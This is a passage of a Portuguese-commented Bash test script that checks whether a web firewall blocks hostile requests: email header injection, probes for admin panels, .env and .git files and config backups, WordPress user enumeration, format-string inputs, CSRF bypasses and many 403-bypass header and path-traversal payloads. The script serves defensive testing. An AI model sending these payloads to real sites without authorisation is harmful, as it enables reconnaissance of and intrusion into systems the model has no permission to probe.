    test_curl "Email: Multiple recipients" "block" -A "$UA" -Lk "${URL}?to=victim@test.com,attacker@evil.com"
    test_curl "Email: Header in From" "block" -A "$UA" -Lk "${URL}?from=attacker@evil.com%0AReply-To:admin@target.com"
    test_curl "Email: Null byte" "block" -A "$UA" -Lk "${URL}?email=test@test.com%00.evil.com"
}

#==============================================================================
# DEFAULT CREDENTIALS CHECK
#==============================================================================
test_default_credentials() {
    print_section "🔑 TESTES DE CREDENCIAIS PADRÃO / PAINÉIS ADMIN"
    
    echo -e "  ${YELLOW}ℹ️  Verificando acessibilidade de painéis admin e endpoints sensíveis${NC}"
    echo -e "  ${YELLOW}   Esses endpoints devem retornar 403/404 ou redirecionar para login${NC}"
    echo ""
    
    print_subsection "Painéis Admin Genéricos"
    test_curl "Admin: /admin" "block" -A "$UA" -Lk "${URL}/admin"
    test_curl "Admin: /admin/" "block" -A "$UA" -Lk "${URL}/admin/"
    test_curl "Admin: /administrator" "block" -A "$UA" -Lk "${URL}/administrator"
    test_curl "Admin: /admin.php" "block" -A "$UA" -Lk "${URL}/admin.php"
    test_curl "Admin: /adminpanel" "block" -A "$UA" -Lk "${URL}/adminpanel"
    test_curl "Admin: /cpanel" "block" -A "$UA" -Lk "${URL}/cpanel"
    test_curl "Admin: /dashboard" "block" -A "$UA" -Lk "${URL}/dashboard"
    test_curl "Admin: /manage" "block" -A "$UA" -Lk "${URL}/manage"
    test_curl "Admin: /manager" "block" -A "$UA" -Lk "${URL}/manager"
    test_curl "Admin: /controlpanel" "block" -A "$UA" -Lk "${URL}/controlpanel"
    
    print_subsection "WordPress Específico"
    test_curl "WP: /wp-admin" "block" -A "$UA" -Lk "${URL}/wp-admin"
    test_curl "WP: /wp-login.php" "block" -A "$UA" -Lk "${URL}/wp-login.php"
    test_curl "WP: /xmlrpc.php" "block" -A "$UA" -Lk "${URL}/xmlrpc.php"
    test_curl "WP: /wp-config.php.bak" "block" -A "$UA" -Lk "${URL}/wp-config.php.bak"
    test_curl "WP: /wp-config.php~" "block" -A "$UA" -Lk "${URL}/wp-config.php~"
    test_curl "WP: /wp-config.php.save" "block" -A "$UA" -Lk "${URL}/wp-config.php.save"
    test_curl "WP: /wp-content/debug.log" "block" -A "$UA" -Lk "${URL}/wp-content/debug.log"
    test_curl "WP: /wp-json/wp/v2/users" "block" -A "$UA" -Lk "${URL}/wp-json/wp/v2/users"
    
    print_subsection "Database Admin"
    test_curl "DB: /phpmyadmin" "block" -A "$UA" -Lk "${URL}/phpmyadmin"
    test_curl "DB: /phpMyAdmin" "block" -A "$UA" -Lk "${URL}/phpMyAdmin"
    test_curl "DB: /pma" "block" -A "$UA" -Lk "${URL}/pma"
    test_curl "DB: /mysql" "block" -A "$UA" -Lk "${URL}/mysql"
    test_curl "DB: /adminer" "block" -A "$UA" -Lk "${URL}/adminer"
    test_curl "DB: /adminer.php" "block" -A "$UA" -Lk "${URL}/adminer.php"
    
    print_subsection "Arquivos Sensíveis"
    test_curl "Sensível: /.env" "block" -A "$UA" -Lk "${URL}/.env"
    test_curl "Sensível: /.git/config" "block" -A "$UA" -Lk "${URL}/.git/config"
    test_curl "Sensível: /.git/HEAD" "block" -A "$UA" -Lk "${URL}/.git/HEAD"
    test_curl "Sensível: /.svn/wc.db" "block" -A "$UA" -Lk "${URL}/.svn/wc.db"
    test_curl "Sensível: /config.php" "block" -A "$UA" -Lk "${URL}/config.php"
    test_curl "Sensível: /configuration.php" "block" -A "$UA" -Lk "${URL}/configuration.php"
    test_curl "Sensível: /settings.php" "block" -A "$UA" -Lk "${URL}/settings.php"
    test_curl "Sensível: /database.yml" "block" -A "$UA" -Lk "${URL}/database.yml"
    test_curl "Sensível: /config.yml" "block" -A "$UA" -Lk "${URL}/config.yml"
    test_curl "Sensível: /credentials.json" "block" -A "$UA" -Lk "${URL}/credentials.json"
    test_curl "Sensível: /secrets.json" "block" -A "$UA" -Lk "${URL}/secrets.json"
    test_curl "Sensível: /.htpasswd" "block" -A "$UA" -Lk "${URL}/.htpasswd"
    test_curl "Sensível: /.htaccess" "block" -A "$UA" -Lk "${URL}/.htaccess"
    test_curl "Sensível: /server-status" "block" -A "$UA" -Lk "${URL}/server-status"
    test_curl "Sensível: /server-info" "block" -A "$UA" -Lk "${URL}/server-info"
    test_curl "Sensível: /info.php" "block" -A "$UA" -Lk "${URL}/info.php"
    test_curl "Sensível: /phpinfo.php" "block" -A "$UA" -Lk "${URL}/phpinfo.php"
    test_curl "Sensível: /test.php" "block" -A "$UA" -Lk "${URL}/test.php"
    
    print_subsection "Backup Files"
    test_curl "Backup: .bak" "block" -A "$UA" -Lk "${URL}/index.php.bak"
    test_curl "Backup: .old" "block" -A "$UA" -Lk "${URL}/index.php.old"
    test_curl "Backup: .backup" "block" -A "$UA" -Lk "${URL}/backup.sql"
    test_curl "Backup: .sql" "block" -A "$UA" -Lk "${URL}/database.sql"
    test_curl "Backup: .zip" "block" -A "$UA" -Lk "${URL}/backup.zip"
    test_curl "Backup: .tar.gz" "block" -A "$UA" -Lk "${URL}/backup.tar.gz"
    test_curl "Backup: dump.sql" "block" -A "$UA" -Lk "${URL}/dump.sql"
    
    print_subsection "API Endpoints"
    test_curl "API: /api" "block" -A "$UA" -Lk "${URL}/api"
    test_curl "API: /api/v1" "block" -A "$UA" -Lk "${URL}/api/v1"
    test_curl "API: /api/users" "block" -A "$UA" -Lk "${URL}/api/users"
    test_curl "API: /api/admin" "block" -A "$UA" -Lk "${URL}/api/admin"
    test_curl "API: /graphql" "block" -A "$UA" -Lk "${URL}/graphql"
    test_curl "API: /swagger" "block" -A "$UA" -Lk "${URL}/swagger"
    test_curl "API: /swagger-ui" "block" -A "$UA" -Lk "${URL}/swagger-ui"
    test_curl "API: /api-docs" "block" -A "$UA" -Lk "${URL}/api-docs"
    test_curl "API: /openapi.json" "block" -A "$UA" -Lk "${URL}/openapi.json"
}

#==============================================================================
# ACCOUNT ENUMERATION TESTS
#==============================================================================
test_account_enumeration() {
    print_section "👤 TESTES DE ENUMERAÇÃO DE CONTAS"
    
    echo -e "  ${YELLOW}ℹ️  Verificando se respostas diferentes revelam existência de usuários${NC}"
    echo ""
    
    print_subsection "WordPress User Enumeration"
    test_curl "WP Enum: ?author=1" "block" -A "$UA" -Lk "${URL}/?author=1"
    test_curl "WP Enum: ?author=2" "block" -A "$UA" -Lk "${URL}/?author=2"
    test_curl "WP Enum: ?author=3" "block" -A "$UA" -Lk "${URL}/?author=3"
    test_curl "WP Enum: REST API users" "block" -A "$UA" -Lk "${URL}/wp-json/wp/v2/users"
    test_curl "WP Enum: oembed author" "block" -A "$UA" -Lk "${URL}/wp-json/oembed/1.0/embed?url=${URL}"
    
    print_subsection "Login Enumeration (diferença de resposta)"
    # Testar com credenciais que provavelmente não existem
    test_curl "Login: admin/wrongpass" "allow" -A "$UA" -Lk -X POST -d "username=admin&password=wrongpassword123" "${URL}/wp-login.php"
    test_curl "Login: nonexistent/wrongpass" "allow" -A "$UA" -Lk -X POST -d "username=nonexistent_user_xyz123&password=wrongpassword123" "${URL}/wp-login.php"
    
    print_subsection "Email Enumeration"
    test_curl "Email: forgot password existing" "allow" -A "$UA" -Lk -X POST -d "email=admin@localhost" "${URL}/wp-login.php?action=lostpassword"
    test_curl "Email: forgot password nonexistent" "allow" -A "$UA" -Lk -X POST -d "email=nonexistent_xyz123@invalid.local" "${URL}/wp-login.php?action=lostpassword"
    
    echo ""
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}💡 Proteção contra Enumeração:${NC}"
    echo -e "  ${YELLOW}• WordPress:${NC} Usar plugin como 'Stop User Enumeration'"
    echo -e "  ${YELLOW}• Login:${NC} Mesma mensagem para usuário inexistente e senha errada"
    echo -e "  ${YELLOW}• API:${NC} Desabilitar /wp-json/wp/v2/users ou requerer autenticação"
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

#==============================================================================
# FORMAT STRING INJECTION
#==============================================================================
test_format_string() {
    print_section "📝 TESTES DE FORMAT STRING INJECTION"
    
    print_subsection "Format String em Parâmetros"
    test_curl "Format: %s" "block" -A "$UA" -Lk "${URL}?input=%s%s%s%s%s"
    test_curl "Format: %x" "block" -A "$UA" -Lk "${URL}?input=%x%x%x%x%x"
    test_curl "Format: %n" "block" -A "$UA" -Lk "${URL}?input=%n%n%n%n%n"
    test_curl "Format: %d" "block" -A "$UA" -Lk "${URL}?input=%d%d%d%d%d"
    test_curl "Format: %p" "block" -A "$UA" -Lk "${URL}?input=%p%p%p%p%p"
    test_curl "Format: mixed" "block" -A "$UA" -Lk "${URL}?input=%08x.%08x.%08x.%08x"
    test_curl "Format: direct param" "block" -A "$UA" -Lk "${URL}?input=%1\$s%2\$s%3\$s"
    test_curl "Format: width spec" "block" -A "$UA" -Lk "${URL}?input=%400d"
    test_curl "Format: precision" "block" -A "$UA" -Lk "${URL}?input=%.5000d"
    
    print_subsection "Format String em Headers"
    test_curl "Format: User-Agent %s" "block" -A "%s%s%s%s%s" -Lk "$URL"
    test_curl "Format: Referer %x" "block" -A "$UA" -Lk -H "Referer: %x%x%x%x" "$URL"
    test_curl "Format: Cookie %n" "block" -A "$UA" -Lk --cookie "data=%n%n%n" "$URL"
}

#==============================================================================
# CSRF PROTECTION CHECK
#==============================================================================
test_csrf_protection() {
    print_section "🛡️ TESTES DE PROTEÇÃO CSRF"
    
    echo -e "  ${YELLOW}ℹ️  Verificando proteções contra Cross-Site Request Forgery${NC}"
    echo ""
    
    print_subsection "Requisições POST sem Token CSRF"
    test_curl "CSRF: POST sem token" "block" -A "$UA" -Lk -X POST -d "action=delete&id=1" "$URL"
    test_curl "CSRF: POST formulário fake" "block" -A "$UA" -Lk -X POST -d "email=test@test.com&password=test123" "${URL}/wp-login.php"
    test_curl "CSRF: POST com Referer externo" "block" -A "$UA" -Lk -X POST -H "Referer: http://evil.com" -d "action=update" "$URL"
    test_curl "CSRF: POST sem Referer" "block" -A "$UA" -Lk -X POST -H "Referer:" -d "action=update" "$URL"
    test_curl "CSRF: POST com Origin externo" "block" -A "$UA" -Lk -X POST -H "Origin: http://evil.com" -d "action=update" "$URL"
    
    print_subsection "Verificar Headers de Proteção"
    
    # Obter headers
    local headers
    headers=$(curl -sI -A "$UA" -Lk "$URL" 2>/dev/null)
    
    # Verificar SameSite em cookies
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    if echo "$headers" | grep -qi "SameSite"; then
        PASSED_TESTS=$((PASSED_TESTS + 1))
        if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
            echo -e "  ${GREEN}[✓]${NC} SameSite cookie attribute: ${GREEN}Presente${NC}"
        fi
    else
        FAILED_TESTS=$((FAILED_TESTS + 1))
        if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
            echo -e "  ${RED}[✗]${NC} SameSite cookie attribute: ${RED}Ausente${NC}"
        fi
    fi
    
    print_subsection "Tentativas de Bypass CSRF"
    test_curl "CSRF Bypass: Content-Type text/plain" "block" -A "$UA" -Lk -X POST -H "Content-Type: text/plain" -d "action=delete" "$URL"
    test_curl "CSRF Bypass: Content-Type multipart" "block" -A "$UA" -Lk -X POST -H "Content-Type: multipart/form-data" -F "action=delete" "$URL"
    test_curl "CSRF Bypass: X-Requested-With XMLHttpRequest" "block" -A "$UA" -Lk -X POST -H "X-Requested-With: XMLHttpRequest" -d "action=delete" "$URL"
    test_curl "CSRF Bypass: JSON Content-Type" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"action":"delete"}' "$URL"
    
    echo ""
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}💡 Proteção CSRF Recomendada:${NC}"
    echo -e "  ${YELLOW}• Tokens CSRF:${NC} Usar tokens únicos por sessão/formulário"
    echo -e "  ${YELLOW}• SameSite Cookie:${NC} Definir SameSite=Strict ou SameSite=Lax"
    echo -e "  ${YELLOW}• Verificar Referer:${NC} Validar origem das requisições"
    echo -e "  ${YELLOW}• Double Submit:${NC} Cookie + header/body com mesmo token"
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

#==============================================================================
# 403 BYPASS TECHNIQUES (Técnicas de Bypass para Erro 403)
#==============================================================================
test_403_bypass() {
    print_section "🔓 TESTES DE 403 BYPASS (100+ testes)"
    
    echo -e "  ${YELLOW}ℹ️  Testando técnicas para bypass de restrições 403 Forbidden${NC}"
    echo -e "  ${YELLOW}   Esses testes devem ser BLOQUEADOS para garantir a segurança${NC}"
    echo ""
    
    print_subsection "Header Bypass - IP Spoofing"
    test_curl "403: X-Originally-Forwarded-For" "block" -A "$UA" -Lk -H "X-Originally-Forwarded-For: 127.0.0.1" "$URL"
    test_curl "403: X-Originating-" "block" -A "$UA" -Lk -H "X-Originating-: 127.0.0.1" "$URL"
    test_curl "403: True-Client-IP" "block" -A "$UA" -Lk -H "True-Client-IP: 127.0.0.1" "$URL"
    test_curl "403: X-WAP-Profile" "block" -A "$UA" -Lk -H "X-WAP-Profile: 127.0.0.1" "$URL"
    test_curl "403: CF-Connecting_IP (underscore)" "block" -A "$UA" -Lk -H "CF-Connecting_IP: 127.0.0.1" "$URL"
    test_curl "403: CF-Connecting-IP (hyphen)" "block" -A "$UA" -Lk -H "CF-Connecting-IP: 127.0.0.1" "$URL"
    test_curl "403: Destination" "block" -A "$UA" -Lk -H "Destination: 127.0.0.1" "$URL"
    test_curl "403: Proxy" "block" -A "$UA" -Lk -H "Proxy: 127.0.0.1" "$URL"
    test_curl "403: X-Custom-IP-Authorization" "block" -A "$UA" -Lk -H "X-Custom-IP-Authorization: 127.0.0.1" "$URL"
    test_curl "403: Base-Url" "block" -A "$UA" -Lk -H "Base-Url: 127.0.0.1" "$URL"
    test_curl "403: Http-Url" "block" -A "$UA" -Lk -H "Http-Url: 127.0.0.1" "$URL"
    test_curl "403: Proxy-Host" "block" -A "$UA" -Lk -H "Proxy-Host: 127.0.0.1" "$URL"
    test_curl "403: Proxy-Url" "block" -A "$UA" -Lk -H "Proxy-Url: 127.0.0.1" "$URL"
    test_curl "403: Real-Ip" "block" -A "$UA" -Lk -H "Real-Ip: 127.0.0.1" "$URL"
    test_curl "403: Redirect" "block" -A "$UA" -Lk -H "Redirect: 127.0.0.1" "$URL"
    test_curl "403: Referrer" "block" -A "$UA" -Lk -H "Referrer: 127.0.0.1" "$URL"
    test_curl "403: Request-Uri" "block" -A "$UA" -Lk -H "Request-Uri: 127.0.0.1" "$URL"
    test_curl "403: Uri" "block" -A "$UA" -Lk -H "Uri: 127.0.0.1" "$URL"
    test_curl "403: Url" "block" -A "$UA" -Lk -H "Url: 127.0.0.1" "$URL"
    
    print_subsection "Header Bypass - Additional XFF Variants"
    test_curl "403: X-Forward-For (typo)" "block" -A "$UA" -Lk -H "X-Forward-For: 127.0.0.1" "$URL"
    test_curl "403: X-Forwarded-By" "block" -A "$UA" -Lk -H "X-Forwarded-By: 127.0.0.1" "$URL"
    test_curl "403: X-Forwarded-For-Original" "block" -A "$UA" -Lk -H "X-Forwarded-For-Original: 127.0.0.1" "$URL"
    test_curl "403: X-Forwarded-Server" "block" -A "$UA" -Lk -H "X-Forwarded-Server: 127.0.0.1" "$URL"
    test_curl "403: X-Forwarded (short)" "block" -A "$UA" -Lk -H "X-Forwarded: 127.0.0.1" "$URL"
    test_curl "403: X-Forwarder-For" "block" -A "$UA" -Lk -H "X-Forwarder-For: 127.0.0.1" "$URL"
    test_curl "403: X-Http-Destinationurl" "block" -A "$UA" -Lk -H "X-Http-Destinationurl: 127.0.0.1" "$URL"
    test_curl "403: X-Http-Host-Override" "block" -A "$UA" -Lk -H "X-Http-Host-Override: 127.0.0.1" "$URL"
    test_curl "403: X-Original-Remote-Addr" "block" -A "$UA" -Lk -H "X-Original-Remote-Addr: 127.0.0.1" "$URL"
    test_curl "403: X-Proxy-Url" "block" -A "$UA" -Lk -H "X-Proxy-Url: 127.0.0.1" "$URL"
    test_curl "403: X-Real-Ip" "block" -A "$UA" -Lk -H "X-Real-Ip: 127.0.0.1" "$URL"
    test_curl "403: X-OReferrer (encoded)" "block" -A "$UA" -Lk -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" "$URL"
    
    print_subsection "Header Bypass - Domain/URL Headers"
    local domain_part
    domain_part=$(echo "$URL" | sed -E 's|https?://([^/:]+).*|\1|')
    test_curl "403: Profile http://" "block" -A "$UA" -Lk -H "Profile: http://${domain_part}" "$URL"
    test_curl "403: X-Arbitrary http://" "block" -A "$UA" -Lk -H "X-Arbitrary: http://${domain_part}" "$URL"
    test_curl "403: X-HTTP-DestinationURL" "block" -A "$UA" -Lk -H "X-HTTP-DestinationURL: http://${domain_part}" "$URL"
    test_curl "403: X-Forwarded-Proto http" "block" -A "$UA" -Lk -H "X-Forwarded-Proto: http://${domain_part}" "$URL"
    test_curl "403: Referer self" "block" -A "$UA" -Lk -H "Referer: ${URL}" "$URL"
    
    print_subsection "Port Bypass via X-Forwarded-Port"
    test_curl "403: X-Forwarded-Port 443" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 443" "$URL"
    test_curl "403: X-Forwarded-Port 4443" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 4443" "$URL"
    test_curl "403: X-Forwarded-Port 80" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 80" "$URL"
    test_curl "403: X-Forwarded-Port 8080" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 8080" "$URL"
    test_curl "403: X-Forwarded-Port 8443" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 8443" "$URL"
    
    print_subsection "Protocol Bypass"
    test_curl "403: X-Forwarded-Scheme http" "block" -A "$UA" -Lk -H "X-Forwarded-Scheme: http" "$URL"
    test_curl "403: X-Forwarded-Scheme https" "block" -A "$UA" -Lk -H "X-Forwarded-Scheme: https" "$URL"
    
    print_subsection "URL Encode Bypass - Basic"
    test_curl "403: #?" "block" -A "$UA" -Lk --path-as-is "${URL}#?"
    test_curl "403: %09 (tab)" "block" -A "$UA" -Lk --path-as-is "${URL}%09"
    test_curl "403: %09%3b" "block" -A "$UA" -Lk --path-as-is "${URL}%09%3b"
    test_curl "403: %09.." "block" -A "$UA" -Lk --path-as-is "${URL}%09.."
    test_curl "403: %09;" "block" -A "$UA" -Lk --path-as-is "${URL}%09;"
    test_curl "403: %20 (space)" "block" -A "$UA" -Lk --path-as-is "${URL}%20"
    test_curl "403: %23%3f (#?)" "block" -A "$UA" -Lk --path-as-is "${URL}%23%3f"
    test_curl "403: %252f%252f (//)" "block" -A "$UA" -Lk --path-as-is "${URL}%252f%252f"
    test_curl "403: %252f/" "block" -A "$UA" -Lk --path-as-is "${URL}%252f/"
    test_curl "403: %2e%2e (..)" "block" -A "$UA" -Lk --path-as-is "${URL}%2e%2e"
    test_curl "403: %2e%2e/" "block" -A "$UA" -Lk --path-as-is "${URL}%2e%2e/"
    test_curl "403: %2f (/)" "block" -A "$UA" -Lk --path-as-is "${URL}%2f"
    test_curl "403: %2f%20%23" "block" -A "$UA" -Lk --path-as-is "${URL}%2f%20%23"
    test_curl "403: %2f%23" "block" -A "$UA" -Lk --path-as-is "${URL}%2f%23"
    test_curl "403: %2f%2f (//)" "block" -A "$UA" -Lk --path-as-is "${URL}%2f%2f"
    
    print_subsection "URL Encode Bypass - Semicolon Tricks"
    test_curl "403: %3b (;)" "block" -A "$UA" -Lk --path-as-is "${URL}%3b"
    test_curl "403: %3b%09" "block" -A "$UA" -Lk --path-as-is "${URL}%3b%09"
    test_curl "403: %3b%2f%2e%2e" "block" -A "$UA" -Lk --path-as-is "${URL}%3b%2f%2e%2e"
    test_curl "403: %3b/.." "block" -A "$UA" -Lk --path-as-is "${URL}%3b/.."
    test_curl "403: %3b//%2f../" "block" -A "$UA" -Lk --path-as-is "${URL}%3b//%2f../"
    test_curl "403: %3f%23 (?#)" "block" -A "$UA" -Lk --path-as-is "${URL}%3f%23"
    test_curl "403: %3f%3f (??)" "block" -A "$UA" -Lk --path-as-is "${URL}%3f%3f"
    
    print_subsection "URL Encode Bypass - Path Traversal Variations"
    test_curl "403: .. (dotdot)" "block" -A "$UA" -Lk --path-as-is "${URL}.."
    test_curl "403: ..%00/;" "block" -A "$UA" -Lk --path-as-is "${URL}..%00/;"
    test_curl "403: ..%00;/" "block" -A "$UA" -Lk --path-as-is "${URL}..%00;/"
    test_curl "403: ..%09" "block" -A "$UA" -Lk --path-as-is "${URL}..%09"
    test_curl "403: ..%0d/;" "block" -A "$UA" -Lk --path-as-is "${URL}..%0d/;"
    test_curl "403: ..%0d;/" "block" -A "$UA" -Lk --path-as-is "${URL}..%0d;/"
    test_curl "403: ..%5c/" "block" -A "$UA" -Lk --path-as-is "${URL}..%5c/"
    test_curl "403: ..%ff/;" "block" -A "$UA" -Lk --path-as-is "${URL}..%ff/;"
    test_curl "403: ..%ff;/" "block" -A "$UA" -Lk --path-as-is "${URL}..%ff;/"
    test_curl "403: ..;%00/" "block" -A "$UA" -Lk --path-as-is "${URL}..;%00/"
    test_curl "403: ..;%0d/" "block" -A "$UA" -Lk --path-as-is "${URL}..;%0d/"
    test_curl "403: ..;%ff/" "block" -A "$UA" -Lk --path-as-is "${URL}..;%ff/"
    
    print_subsection "URL Encode Bypass - Slash Variations"
    test_curl "403: /%20#" "block" -A "$UA" -Lk --path-as-is "${URL}/%20#"
    test_curl "403: /%20%23" "block" -A "$UA" -Lk --path-as-is "${URL}/%20%23"
    test_curl "403: /%252e%252e%252f/" "block" -A "$UA" -Lk --path-as-is "${URL}/%252e%252e%252f/"
    test_curl "403: /%252e%252e%253b/" "block" -A "$UA" -Lk --path-as-is "${URL}/%252e%252e%253b/"
    test_curl "403: /%252e%252f/" "block" -A "$UA" -Lk --path-as-is "${URL}/%252e%252f/"
    test_curl "403: /%252e%253b/" "block" -A "$UA" -Lk --path-as-is "${URL}/%252e%253b/"
    test_curl "403: /%252e/" "block" -A "$UA" -Lk --path-as-is "${URL}/%252e/"
    test_curl "403: /%252f" "block" -A "$UA" -Lk --path-as-is "${URL}/%252f"
    test_curl "403: /%2e%2e" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2e"
    test_curl "403: /%2e%2e%3b/" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2e%3b/"
    test_curl "403: /%2e%2e/" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2e/"
    test_curl "403: /%2e%2f/" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2f/"
    test_curl "403: /%2e%3b/" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%3b/"
    test_curl "403: /%2e%3b//" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%3b//"
    test_curl "403: /%2e/" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e/"
    test_curl "403: /%2e//" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e//"
    test_curl "403: /%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/%2f"
    test_curl "403: /%3b/" "block" -A "$UA" -Lk --path-as-is "${URL}/%3b/"
    
    print_subsection "URL Encode Bypass - Parent Directory"
    test_curl "403: /.." "block" -A "$UA" -Lk --path-as-is "${URL}/.."
    test_curl "403: /..%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..%2f"
    test_curl "403: /..%2f..%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..%2f..%2f"
    test_curl "403: /..%2f..%2f..%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..%2f..%2f..%2f"
    test_curl "403: /../" "block" -A "$UA" -Lk --path-as-is "${URL}/../"
    test_curl "403: /../../" "block" -A "$UA" -Lk --path-as-is "${URL}/../../"
    test_curl "403: /../../../" "block" -A "$UA" -Lk --path-as-is "${URL}/../../../"
    test_curl "403: /../../..//" "block" -A "$UA" -Lk --path-as-is "${URL}/../../..//"
    test_curl "403: /../..//" "block" -A "$UA" -Lk --path-as-is "${URL}/../..//"
    test_curl "403: /../..//../" "block" -A "$UA" -Lk --path-as-is "${URL}/../..//../"
    
    print_subsection "URL Encode Bypass - Semicolon Path Tricks"
    test_curl "403: /../..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/../..;/"
    test_curl "403: /.././../" "block" -A "$UA" -Lk --path-as-is "${URL}/.././../"
    test_curl "403: /../.;/../" "block" -A "$UA" -Lk --path-as-is "${URL}/../.;/../"
    test_curl "403: /..//" "block" -A "$UA" -Lk --path-as-is "${URL}/..//"
    test_curl "403: /..//../" "block" -A "$UA" -Lk --path-as-is "${URL}/..//../"
    test_curl "403: /..//../../" "block" -A "$UA" -Lk --path-as-is "${URL}/..//../../"
    test_curl "403: /..//..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..//..;/"
    test_curl "403: /../;/" "block" -A "$UA" -Lk --path-as-is "${URL}/../;/"
    test_curl "403: /../;/../" "block" -A "$UA" -Lk --path-as-is "${URL}/../;/../"
    
    print_subsection "URL Encode Bypass - Encoded Semicolon"
    test_curl "403: /..;%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..;%2f"
    test_curl "403: /..;%2f..;%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..;%2f..;%2f"
    test_curl "403: /..;%2f..;%2f..;%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..;%2f..;%2f..;%2f"
    test_curl "403: /..;/../" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/../"
    test_curl "403: /..;/..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/..;/"
    test_curl "403: /..;//" "block" -A "$UA" -Lk --path-as-is "${URL}/..;//"
    test_curl "403: /..;//../" "block" -A "$UA" -Lk --path-as-is "${URL}/..;//../"
    test_curl "403: /..;//..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..;//..;/"
    test_curl "403: /..;/;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/;/"
    test_curl "403: /..;/;/..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/;/..;/"
    
    print_subsection "URL Encode Bypass - Double/Triple Slash"
    test_curl "403: /.//" "block" -A "$UA" -Lk --path-as-is "${URL}/.//"
    test_curl "403: /.;/" "block" -A "$UA" -Lk --path-as-is "${URL}/.;/"
    test_curl "403: /.;//" "block" -A "$UA" -Lk --path-as-is "${URL}/.;//"
    test_curl "403: //.." "block" -A "$UA" -Lk --path-as-is "${URL}//.."
    test_curl "403: //../../" "block" -A "$UA" -Lk --path-as-is "${URL}//../../"
    test_curl "403: //..;" "block" -A "$UA" -Lk --path-as-is "${URL}//..;"
    test_curl "403: //./" "block" -A "$UA" -Lk --path-as-is "${URL}//./"
    test_curl "403: //.;/" "block" -A "$UA" -Lk --path-as-is "${URL}//.;/"
    test_curl "403: ///.." "block" -A "$UA" -Lk --path-as-is "${URL}///.."
    test_curl "403: ///../" "block" -A "$UA" -Lk --path-as-is "${URL}///../"
    test_curl "403: ///..//" "block" -A "$UA" -Lk --path-as-is "${URL}///..//"
    test_curl "403: ///..;" "block" -A "$UA" -Lk --path-as-is "${URL}///..;"
    test_curl "403: ///..;/" "block" -A "$UA" -Lk --path-as-is "${URL}///..;/"
    test_curl "403: ///..;//" "block" -A "$UA" -Lk --path-as-is "${URL}///..;//"
    test_curl "403: //;/" "block" -A "$UA" -Lk --path-as-is "${URL}//;/"
    test_curl "403: /;/" "block" -A "$UA" -Lk --path-as-is "${URL}/;/"
    test_curl "403: /;//" "block" -A "$UA" -Lk --path-as-is "${URL}/;//"
    
    print_subsection "URL Encode Bypass - Special Characters"
    test_curl "403: ; (semicolon)" "block" -A "$UA" -Lk --path-as-is "${URL};"
    test_curl "403: ;%09" "block" -A "$UA" -Lk --path-as-is "${URL};%09"
    test_curl "403: ;%09.." "block" -A "$UA" -Lk --path-as-is "${URL};%09.."
    test_curl "403: ;%09..;" "block" -A "$UA" -Lk --path-as-is "${URL};%09..;"
    test_curl "403: ;%09;" "block" -A "$UA" -Lk --path-as-is "${URL};%09;"
    test_curl "403: ;%2F.." "block" -A "$UA" -Lk --path-as-is "${URL};%2F.."
    test_curl "403: ;%2f%2e%2e" "block" -A "$UA" -Lk --path-as-is "${URL};%2f%2e%2e"
    test_curl "403: & (ampersand)" "block" -A "$UA" -Lk --path-as-is "${URL}&"
    test_curl "403: % (percent)" "block" -A "$UA" -Lk --path-as-is "${URL}%"
    test_curl "403: ../" "block" -A "$UA" -Lk --path-as-is "${URL}../"
    test_curl "403: ..%2f" "block" -A "$UA" -Lk --path-as-is "${URL}..%2f"
    test_curl "403: .././" "block" -A "$UA" -Lk --path-as-is "${URL}.././"
    test_curl "403: ..%00/" "block" -A "$UA" -Lk --path-as-is "${URL}..%00/"
    test_curl "403: ..%0d/" "block" -A "$UA" -Lk --path-as-is "${URL}..%0d/"
    test_curl "403: ..%5c" "block" -A "$UA" -Lk --path-as-is "${URL}..%5c"
    test_curl "403: ..%ff" "block" -A "$UA" -Lk --path-as-is "${URL}..%ff"
    
    print_subsection "URL Encode Bypass - Additional Encodings"
    test_curl "403: %2e%2e%2f" "block" -A "$UA" -Lk --path-as-is "${URL}%2e%2e%2f"
